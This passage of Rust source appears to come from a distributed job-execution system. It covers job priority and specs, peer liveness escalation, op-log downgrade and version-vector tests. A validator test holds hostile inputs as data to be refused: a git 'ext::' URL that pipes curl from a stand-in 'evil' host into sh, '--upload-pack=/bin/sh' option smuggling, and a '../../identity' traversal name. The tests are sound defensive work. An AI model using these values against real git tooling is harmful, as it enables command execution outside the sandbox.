    pub fn from_score(score: u8) -> JobPriority {
        match score {
            0..=33 => JobPriority::Low,
            34..=66 => JobPriority::Normal,
            _ => JobPriority::High,
        }
    }

    /// The other way, to compare an ad-hoc job with a deployment: 25, 50, 75.
    pub fn score(&self) -> u8 {
        match self {
            JobPriority::Low => 25,
            JobPriority::Normal => 50,
            JobPriority::High => 75,
        }
    }
}

/// The full specification of a job as submitted.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct JobSpec {
    pub job_id: JobId,
    pub payload: JobPayload,
    /// Environment KEY=VALUE pairs; values may contain `{{secret:…}}` /
    /// `{{secret_file:…}}` references, resolved on the executor at spawn
    /// time and never persisted resolved (MASTERPLAN §7.3).
    pub env: Vec<(String, String)>,
    /// Seconds; None = no timeout.
    pub timeout_secs: Option<u64>,
    /// Queue priority on the executor (MASTERPLAN §10.2).
    pub priority: JobPriority,
    pub submitter: NodeId,
    pub submitter_user: UserId,
    /// The user's signed request envelope that authorized this job. The
    /// executor re-verifies it and enforces the user's grants against its
    /// own materialized policy (MASTERPLAN §7.2 "enforcement happens on the
    /// executing node").
    pub auth: SignedIpc,
    /// Set when this job is one target of a fan-out submission.
    pub fanout: Option<FanoutInfo>,
    pub created_at_micros: u64,
}

impl JobPayload {
    /// The runtime this payload needs (T3).
    ///
    /// **Derived from the payload rather than stamped into `env`** at each
    /// of the seven places a `JobSpec` is built. A field that every
    /// constructor must remember to set is a field one of them will forget,
    /// and the symptom would be a container job placed on a node with no
    /// engine — exactly the bug this exists to close.
    ///
    /// An inline command or script is `bash`, and says so: it is a shell
    /// body, and a machine without a shell cannot run it. Not a theoretical
    /// case — a minimal container image is the usual machine without one.
    pub fn needs_runtime(&self) -> crate::content::Runtime {
        match self {
            JobPayload::Service(exec) => exec.runtime,
            JobPayload::Command(_) | JobPayload::Script(_) => crate::content::Runtime::Bash,
        }
    }
}

impl JobSpec {
    /// The runtime this job needs (T3). See [`JobPayload::needs_runtime`].
    pub fn needs_runtime(&self) -> crate::content::Runtime {
        self.payload.needs_runtime()
    }

    /// This job's environment with its runtime requirement in it, for the
    /// feasibility filter (T3). See
    /// [`crate::runtimes::env_for_placement`].
    pub fn env_for_placement(&self) -> std::borrow::Cow<'_, [(String, String)]> {
        crate::runtimes::env_for_placement(&self.env, self.needs_runtime())
    }

    pub fn preview(&self) -> String {
        const MAX: usize = 80;
        let raw = match &self.payload {
            JobPayload::Command(c) => c.replace('\n', " "),
            JobPayload::Service(s) => {
                format!(
                    "{} ({}/{})",
                    s.service_name,
                    s.runtime.as_str(),
                    s.entrypoint
                )
            }
            JobPayload::Script(script) => {
                format!("{} script · {}", script.runtime.as_str(), script.preview())
            }
        };
        if raw.chars().count() <= MAX {
            raw
        } else {
            let cut: String = raw.chars().take(MAX - 1).collect();
            format!("{cut}…")
        }
    }
}

// ---------------------------------------------------------------------------
// Sync primitives
// ---------------------------------------------------------------------------

/// Per-author high-water marks: "I have ops 1..=seq from this author."
pub type VersionVector = Vec<(NodeId, u64)>;

/// Ephemeral liveness observation, exchanged in gossip — never persisted
/// in the op-log (MASTERPLAN §4.3).
#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize, Deserialize)]
pub enum Liveness {
    Alive,
    Suspect,
    Dead,
}

impl Liveness {
    /// How bad this reading is: `Alive` 0, `Suspect` 1, `Dead` 2.
    pub fn severity(self) -> u8 {
        match self {
            Liveness::Alive => 0,
            Liveness::Suspect => 1,
            Liveness::Dead => 2,
        }
    }

    /// The worse of two readings.
    ///
    /// Failure evidence may only ever *escalate* a peer's standing. A
    /// verdict derived from a local failure count was being applied
    /// verbatim over a worse standing learned from gossip, so a peer that
    /// hearsay had already put at `Dead` was promoted back to `Suspect` on
    /// the third *failed* probe — a failure improving the thing it was
    /// evidence against, and then oscillating there for as long as the
    /// peer stayed down.
    pub fn worst(self, other: Self) -> Self {
        if other.severity() > self.severity() {
            other
        } else {
            self
        }
    }
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct LivenessEntry {
    pub node_id: NodeId,
    pub liveness: Liveness,
    /// When the underlying observation was made (observer's HLC).
    pub observed_hlc: Hlc,
}

#[cfg(test)]
mod liveness_tests {
    use super::Liveness;

    /// Failure evidence escalates and never improves.
    ///
    /// The case that mattered is `Dead.worst(Suspect)`: a peer that gossip
    /// had already put at `Dead` carries a local failure count of zero, so
    /// its third *failed* probe computed `Suspect` and — applied verbatim —
    /// promoted it. The log read `from=Dead to=Suspect`, then back to
    /// `Dead` five failures later, for as long as the peer stayed down.
    #[test]
    fn a_failure_never_improves_a_standing() {
        assert_eq!(Liveness::Dead.worst(Liveness::Suspect), Liveness::Dead);
        assert_eq!(Liveness::Dead.worst(Liveness::Alive), Liveness::Dead);
        assert_eq!(Liveness::Suspect.worst(Liveness::Alive), Liveness::Suspect);
    }

    #[test]
    fn it_still_escalates() {
        assert_eq!(Liveness::Alive.worst(Liveness::Suspect), Liveness::Suspect);
        assert_eq!(Liveness::Alive.worst(Liveness::Dead), Liveness::Dead);
        assert_eq!(Liveness::Suspect.worst(Liveness::Dead), Liveness::Dead);
    }

    #[test]
    fn it_is_idempotent() {
        for l in [Liveness::Alive, Liveness::Suspect, Liveness::Dead] {
            assert_eq!(l.worst(l), l);
        }
    }
}

#[cfg(test)]
mod f0_tests {
    use super::*;

    fn hlc() -> Hlc {
        Hlc {
            wall_micros: 42,
            logical: 7,
        }
    }

    fn sample_op() -> Op {
        Op {
            author: NodeId([9u8; 32]),
            seq: 3,
            hlc: hlc(),
            body: OpBody::MemberLeft {
                node_id: NodeId([1u8; 32]),
            },
            signature: vec![0xab; 64],
        }
    }

    /// The property the whole of F0 rests on: wrapping an op does not
    /// change what its signature covers, so every signature ever produced
    /// stays valid byte for byte.
    #[test]
    fn wrapping_preserves_the_signed_bytes() {
        let op = sample_op();
        let env = OpEnvelope::from_op(&op);
        assert_eq!(
            op_signing_bytes(&op.author, op.seq, &op.hlc, &op.body),
            env.signing_bytes()
        );
        assert_eq!(op.signature, env.signature);
    }

    #[test]
    fn a_known_body_round_trips() {
        let op = sample_op();
        let back = OpEnvelope::from_op(&op).to_op().expect("known body");
        assert_eq!(
            postcard::to_stdvec(&back.body).expect("encode"),
            postcard::to_stdvec(&op.body).expect("encode")
        );
    }

    /// `V1_OPBODY_VARIANTS` must be exactly the variant count protocol 1.6
    /// shipped. If a new variant is appended without moving the constant,
    /// this catches it: index 26 is the last 1.6 variant and must still be
    /// sendable, index 27 must not.
    #[test]
    fn the_v1_cutoff_is_where_1_6_stopped() {
        let last_v1 = OpBody::SourceSynced {
            name: "s".into(),
            commit: "c".into(),
            bundle_id: BundleId([0u8; 32]),
        };
        assert_eq!(
            op_body_index(&postcard::to_stdvec(&last_v1).expect("encode")),
            Some(V1_OPBODY_VARIANTS - 1),
            "SourceSynced is the last body protocol 1.6 understands"
        );
    }

    fn opaque(author: u8, seq: u64, index: u32) -> OpEnvelope {
        let mut body = Vec::new();
        let mut n = index;
        loop {
            let byte = (n & 0x7f) as u8;
            n >>= 7;
            if n == 0 {
                body.push(byte);
                break;
            }
            body.push(byte | 0x80);
        }
        OpEnvelope {
            author: NodeId([author; 32]),
            seq,
            hlc: hlc(),
            body,
            signature: vec![0; 64],
        }
    }

    fn known(author: u8, seq: u64) -> OpEnvelope {
        OpEnvelope::from_op(&Op {
            author: NodeId([author; 32]),
            seq,
            hlc: hlc(),
            body: OpBody::MemberLeft {
                node_id: NodeId([author; 32]),
            },
            signature: vec![0; 64],
        })
    }

    /// The downgrade rule, stated as behavior: a legacy peer gets each
    /// author's ops up to but not past that author's first unreadable one,
    /// and the version vector it is told matches exactly — so it believes
    /// it is caught up and stops asking.
    #[test]
    fn downgrade_cuts_per_author_and_truncates_the_vector() {
        let a = NodeId([1u8; 32]);
        let b = NodeId([2u8; 32]);
        let batch = vec![
            known(1, 1),
            known(1, 2),
            opaque(1, 3, V1_OPBODY_VARIANTS),
            known(1, 4), // unreachable: seq is gapless
            known(2, 1),
            known(2, 2),
        ];
        let (ops, cut) = downgrade_for_v1(&batch);
        assert_eq!(
            ops.iter().map(|o| (o.author, o.seq)).collect::<Vec<_>>(),
            vec![(a, 1), (a, 2), (b, 1), (b, 2)]
        );
        assert_eq!(cut, vec![(a, 3)]);

        let mut vv = vec![(a, 4), (b, 2)];
        truncate_vv(&mut vv, &cut);
        assert_eq!(vv, vec![(a, 2), (b, 2)]);
    }

    /// An author whose *first* op is unreadable drops out of the advertised
    /// vector entirely — "I have nothing from them" is the truthful answer,
    /// not "I have op zero".
    #[test]
    fn an_author_cut_at_its_first_op_leaves_the_vector() {
        let a = NodeId([1u8; 32]);
        let (ops, cut) = downgrade_for_v1(&[opaque(1, 1, 40)]);
        assert!(ops.is_empty());
        let mut vv = vec![(a, 1)];
        truncate_vv(&mut vv, &cut);
        assert!(vv.is_empty());
    }

    /// Ordering must not change the answer: the cut is computed over the
    /// whole batch before anything is emitted.
    #[test]
    fn downgrade_is_independent_of_batch_order() {
        let batch = vec![
            known(1, 2),
            opaque(1, 3, V1_OPBODY_VARIANTS),
            known(1, 1),
            known(1, 4),
        ];
        let (ops, cut) = downgrade_for_v1(&batch);
        let mut seqs: Vec<u64> = ops.iter().map(|o| o.seq).collect();
        seqs.sort_unstable();
        assert_eq!(seqs, vec![1, 2]);
        assert_eq!(cut, vec![(NodeId([1u8; 32]), 3)]);
    }

    /// Sync progress is read straight off the two version vectors the
    /// gossip exchange already carries.
    #[test]
    fn vv_lag_counts_ops_and_authors_behind() {
        let a = NodeId([1u8; 32]);
        let b = NodeId([2u8; 32]);
        let c = NodeId([3u8; 32]);
        let ours: VersionVector = vec![(a, 10), (b, 5), (c, 3)];

        // Caught up on b, four behind on a, and has never seen c at all.
        let theirs: VersionVector = vec![(a, 6), (b, 5)];
        assert_eq!(vv_lag(&ours, &theirs), (7, 2));
        assert_eq!(vv_total(&ours), 18);

        // Fully caught up.
        assert_eq!(vv_lag(&ours, &ours), (0, 0));

        // A peer *ahead* of us on an author is the normal mid-gossip state,
        // not a negative lag: it is ignored rather than counted.
        let ahead: VersionVector = vec![(a, 99), (b, 5), (c, 3)];
        assert_eq!(vv_lag(&ours, &ahead), (0, 0));

        // An empty log is fully replicated by definition.
        assert_eq!(vv_lag(&Vec::new(), &theirs), (0, 0));
        assert_eq!(vv_total(&Vec::new()), 0);
    }

    #[test]
    fn body_index_reads_multi_byte_varints() {
        assert_eq!(op_body_index(&[0x00]), Some(0));
        assert_eq!(op_body_index(&[0x7f]), Some(127));
        assert_eq!(op_body_index(&[0x80, 0x01]), Some(128));
        assert_eq!(op_body_index(&[0xac, 0x02]), Some(300));
        assert_eq!(op_body_index(&[]), None);
        // Never-terminating varint: refused rather than looped on.
        assert_eq!(op_body_index(&[0x80; 8]), None);
    }
}

#[cfg(test)]
#[allow(clippy::unwrap_used)]
mod git_source_tests {
    use super::*;

    #[test]
    fn a_name_is_a_directory_name() {
        for ok in ["scripts", "team-a.playbooks", "x_1", "A"] {
            check_source_name(ok).unwrap_or_else(|e| panic!("{ok:?}: {e}"));
        }
        for bad in [
            "",
            ".",
            "..",
            "../../identity",
            "a/b",
            "a\\b",
            "a b",
            "a\0b",
            &"x".repeat(65),
        ] {
            assert!(check_source_name(bad).is_err(), "{bad:?} should be refused");
        }
    }

    #[test]
    fn a_url_may_not_name_a_remote_helper() {
        // The finding: `ext::` runs its argument as a shell command, in the
        // daemon, outside every sandbox.
        for bad in [
            r#"ext::sh -c "curl http://evil/x | sh""#,
            "ext::whoami",
            "fd::7",
            "transport::https://example.com/x",
            "--upload-pack=/bin/sh",
            "-u",
            "",
            "example.com:repo.git",
            "relative/path",
            "https://example.com/\nx",
        ] {
            assert!(check_source_url(bad).is_err(), "{bad:?} should be refused");
        }
        for ok in [
            "https://github.com/neuralpunk/meshware",
            "http://git.internal/repo.git",
            "ssh://git@example.com/x.git",
            "git://example.com/x.git",
            "file:///srv/mirrors/x.git",
            "git@github.com:neuralpunk/meshware.git",
            "/srv/mirrors/x.git",
        ] {
            check_source_url(ok).unwrap_or_else(|e| panic!("{ok:?}: {e}"));
        }
    }

    #[test]
    fn a_branch_is_a_ref_and_never_an_option() {
        for ok in ["main", "release/1.2", "feature.x", "v0.7.0"] {
            check_source_branch(ok).unwrap_or_else(|e| panic!("{ok:?}: {e}"));
        }
        for bad in [
            "",
            "--upload-pack=/bin/sh",
            "-x",
            "a b",
            "a..b",
            "a~1",
            "a^",
            "a:b",
            "a?",
            "a*",
            "a[",
            "/main",
            "main/",
            "main.lock",
            "ma\nin",
        ] {
            assert!(
                check_source_branch(bad).is_err(),
                "{bad:?} should be refused"
            );
        }
    }

    /// **H-4**: the replay path peeks this discriminant instead of
    /// decoding, so a drift between the constant and the variant would
    /// make checkpoints invisible — and a node would then park forever on
    /// the very hole the checkpoint explains.
    #[test]
    fn checkpoint_index_matches_the_variant() {
        let body = postcard::to_stdvec(&OpBody::Checkpoint {
            checkpoint: Box::new(Checkpoint {
                through_seq: 1,
                subsumed: Vec::new(),
                ops_before: 0,
                ops_after: 0,
                horizon_secs: 0,
            }),
        })
        .expect("encode");
        assert_eq!(op_body_index(&body), Some(OPBODY_CHECKPOINT_INDEX));
    }

    /// ENG-3's peeked discriminants, pinned the same way.
    #[test]
    fn audit_and_group_reference_indices_match_their_variants() {
        let entry = crate::AuditEntry {
            audit_id: crate::AuditId([0; 16]),
            at_micros: 0,
            user: crate::UserId([0; 32]),
            username: String::new(),
            action: String::new(),
            target: String::new(),
            node: NodeId([0; 32]),
            outcome: String::new(),
            detail: String::new(),
            request_sig: Vec::new(),
        };
        let index = |body: &OpBody| op_body_index(&postcard::to_stdvec(body).expect("encode"));
        assert_eq!(
            index(&OpBody::AuditAppend { entry }),
            Some(OPBODY_AUDITAPPEND_INDEX)
        );
        let group = crate::FanId([0; 16]);
        let gang = crate::GangId([0; 16]);
        let by = NodeId([0; 32]);
        let found = [
            index(&OpBody::FanoutAdopt { group, by }),
            index(&OpBody::FanoutClosed {
                group,
                succeeded: 0,
                failed: 0,
                skipped: 0,
            }),
            index(&OpBody::GangAdopt { gang, by }),
            index(&OpBody::GangClosed {
                gang,
                outcome: crate::gang::GangOutcome::Succeeded,
                rounds: 0,
            }),
        ];
        assert_eq!(found, OPBODY_GROUP_REFERENCE_INDICES.map(Some));
    }

    /// As above, for the other peeked discriminant (**H-4**).
    #[test]
    fn facts_publish_index_matches_the_variant() {
        let body = postcard::to_stdvec(&OpBody::FactsPublish {
            subject: crate::facts::FactSubject::Node(NodeId([0u8; 32])),
            collector: String::new(),
            doc: Vec::new(),
            digest: [0u8; 32],
            collected_at_micros: 0,
        })
        .expect("encode");
        assert_eq!(op_body_index(&body), Some(OPBODY_FACTSPUBLISH_INDEX));
    }
}
